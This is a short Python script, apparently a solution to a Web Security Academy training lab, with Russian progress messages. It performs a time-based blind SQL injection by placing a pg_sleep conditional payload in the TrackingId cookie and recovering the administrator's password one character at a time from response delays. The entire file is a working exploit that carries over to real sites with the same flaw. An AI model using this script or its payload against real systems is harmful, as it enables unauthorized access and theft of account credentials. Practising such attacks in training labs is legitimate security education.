import requests
import time
import string

URL = "https://0a7a00790404f9548034949b00ff0083.web-security-academy.net"
DELAY = 1

def check_condition(payload_condition):
    payload = f"x' || (SELECT CASE WHEN ({payload_condition}) THEN pg_sleep({DELAY}) ELSE pg_sleep(0) END)--"
    cookies = {'TrackingId': payload}
    
    start_time = time.time()
    requests.get(URL, cookies=cookies)
    elapsed_time = time.time() - start_time
    
    return elapsed_time >= DELAY

def main():
    print("[*] Начинаем извлечение пароля администратора...")
    password = ""
    
    for position in range(1, 31):
        found_char = False
        
        for char in string.ascii_lowercase + string.digits:
            condition = f"SUBSTRING((SELECT password FROM users WHERE username='administrator'), {position}, 1) = '{char}'"
            
            if check_condition(condition):
                password += char
                print(f"[+] Позиция {position}: {char} (Текущий пароль: {password})")
                found_char = True
                break
        
        if not found_char:
            print(f"[!] Символ на позиции {position} не найден. Конец пароля.")
            break
            
    print(f"\n[+] Итоговый пароль: {password}")

if __name__ == "__main__":
    main()